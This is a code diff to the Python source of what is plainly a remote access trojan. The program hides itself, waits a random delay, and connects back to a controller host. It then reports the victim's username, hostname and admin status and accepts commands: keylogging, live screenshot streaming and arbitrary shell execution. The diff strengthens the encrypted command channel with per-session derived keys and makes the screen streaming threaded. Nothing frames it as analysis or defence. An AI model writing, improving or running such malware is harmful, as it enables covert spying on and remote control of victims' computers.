@@ -28,24 +28,36 @@ except Exception:
 CREATE_NO_WINDOW = 0x08000000
 
 
-def keystream(counter, length):
+def hkdf(key, salt, info, length=32):
+    prk = hmac.new(salt, key, hashlib.sha256).digest()
+    out = b""
+    t = b""
+    counter = 1
+    while len(out) < length:
+        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
+        out += t
+        counter += 1
+    return out[:length]
+
+
+def keystream(key_enc, counter, length):
     out = b""
     c = counter
     while len(out) < length:
-        out += hashlib.sha256(KEY + struct.pack("<I", c)).digest()
+        out += hashlib.sha256(key_enc + struct.pack("<Q", c)).digest()
         c += 1
     return out[:length]
 
 
-def mac(data):
-    return hmac.new(KEY, data, hashlib.sha256).digest()[:16]
+def mac(key_mac, data):
+    return hmac.new(key_mac, data, hashlib.sha256).digest()[:16]
 
 
-def send_data(s, data, ctr):
+def send_data(s, data, ctr, key_enc, key_mac):
     if isinstance(data, str):
         data = data.encode()
-    body = mac(data) + data
-    ks = keystream(ctr[0], len(body))
+    body = mac(key_mac, data) + data
+    ks = keystream(key_enc, ctr[0], len(body))
     enc = bytes(a ^ b for a, b in zip(body, ks))
     ctr[0] += (len(body) + 31) // 32
     s.sendall(struct.pack(">I", len(enc)) + enc)
@@ -61,7 +73,7 @@ def recvall(s, n):
     return data
 
 
-def recv_data(s, ctr):
+def recv_data(s, ctr, key_enc, key_mac):
     raw = recvall(s, 4)
     if not raw:
         return None
@@ -71,13 +83,13 @@ def recv_data(s, ctr):
     buf = recvall(s, length)
     if not buf or len(buf) != length:
         return None
-    ks = keystream(ctr[0], len(buf))
+    ks = keystream(key_enc, ctr[0], len(buf))
     plain = bytes(a ^ b for a, b in zip(buf, ks))
     ctr[0] += (len(buf) + 31) // 32
     if len(plain) < 16:
         return None
     tag, msg = plain[:16], plain[16:]
-    if not hmac.compare_digest(tag, mac(msg)):
+    if not hmac.compare_digest(tag, mac(key_mac, msg)):
         return None
     return msg.decode(errors="ignore")
 
@@ -162,7 +174,6 @@ def proc_list():
         return "proclist fail: " + str(e)
 
 
-# --- keylogger ---
 _keylog = []
 _keylog_lock = threading.Lock()
 _keylog_listener = None
@@ -224,60 +235,58 @@ def hide():
         pass
 
 
-def stream_loop(s, send_ctr, recv_ctr):
-    """Send frames until 'stream_stop' arrives. Returns True on normal stop."""
-    streaming = True
-    while streaming:
+_stream_active = threading.Event()
+_stream_thread = None
+_stream_send_lock = threading.Lock()
+
+
+def _stream_worker(s, send_ctr, send_lock, key_enc, key_mac):
+    while _stream_active.is_set():
         frame = take_screenshot()
         if frame.startswith("IMG:"):
             try:
-                send_data(s, "FRAME:" + frame[4:], send_ctr)
+                with send_lock:
+                    send_data(s, "FRAME:" + frame[4:], send_ctr, key_enc, key_mac)
             except Exception:
-                return False
-        # non-blocking check for an incoming stop command
-        try:
-            r, _, _ = select.select([s], [], [], 0.05)
-        except Exception:
-            return False
-        if r:
-            try:
-                s.settimeout(5)
-                msg = recv_data(s, recv_ctr)
-            except Exception:
-                return False
-            finally:
-                try:
-                    s.settimeout(None)
-                except Exception:
-                    pass
-            if msg is None:
-                return False
-            if msg == "stream_stop":
-                streaming = False
-    return True
+                _stream_active.clear()
+                return
+        time.sleep(0.14)
 
 
 def main():
+    global _stream_thread
     hide()
     time.sleep(random.randint(15, 40))
     while True:
         s = None
+        key_enc = key_mac = None
         try:
             s = socket.socket()
             s.settimeout(15)
             s.connect((HOST, PORT))
             s.settimeout(None)
-            send_ctr = [0x1337]
-            recv_ctr = [0x1337]
+
+            nonce_c = os.urandom(16)
+            s.sendall(nonce_c)
+            nonce_s = recvall(s, 16)
+            if not nonce_s or len(nonce_s) != 16:
+                raise Exception("handshake failed")
+
+            salt = nonce_c + nonce_s
+            key_enc = hkdf(KEY, salt, b"crock-enc-v1", 32)
+            key_mac = hkdf(KEY, salt, b"crock-mac-v1", 32)
+
+            send_ctr = [0]
+            recv_ctr = [0]
             info = json.dumps({
                 "u": os.getenv("USERNAME", "?"),
                 "h": os.getenv("COMPUTERNAME", "?"),
                 "a": 1 if is_admin() else 0,
             })
-            send_data(s, info, send_ctr)
+            send_data(s, info, send_ctr, key_enc, key_mac)
 
             while True:
-                cmd = recv_data(s, recv_ctr)
+                cmd = recv_data(s, recv_ctr, key_enc, key_mac)
                 if cmd is None:
                     break
                 reply = "unknown"
@@ -306,21 +315,42 @@ def main():
                         keylog_clear()
                         reply = "cleared"
                     elif cmd == "stream_start":
-                        send_data(s, "stream started", send_ctr)
-                        ok = stream_loop(s, send_ctr, recv_ctr)
-                        reply = "stream stopped" if ok else "stream aborted"
-                        # NOTE: reply sent below by the outer send
+                        if _stream_active.is_set():
+                            reply = "stream already running"
+                        else:
+                            _stream_active.set()
+                            _stream_thread = threading.Thread(
+                                target=_stream_worker,
+                                args=(s, send_ctr, _stream_send_lock, key_enc, key_mac),
+                                daemon=True,
+                            )
+                            _stream_thread.start()
+                            reply = "stream started"
                     elif cmd == "stream_stop":
-                        # idempotent — nothing to stop
-                        reply = "stream stopped"
+                        if _stream_active.is_set():
+                            _stream_active.clear()
+                            if _stream_thread is not None:
+                                _stream_thread.join(timeout=2)
+                                _stream_thread = None
+                            reply = "stream stopped"
+                        else:
+                            reply = "stream stopped"
                     elif cmd.startswith("sh:"):
                         reply = exec_cmd(cmd[3:])
                 except Exception as e:
                     reply = "error: " + str(e)
-                send_data(s, reply, send_ctr)
+                with _stream_send_lock:
+                    send_data(s, reply, send_ctr, key_enc, key_mac)
         except Exception:
             pass
         finally:
+            _stream_active.clear()
+            if _stream_thread is not None:
+                try:
+                    _stream_thread.join(timeout=1)
+                except Exception:
+                    pass
+                _stream_thread = None
             if s is not None:
                 try:
                     s.close()
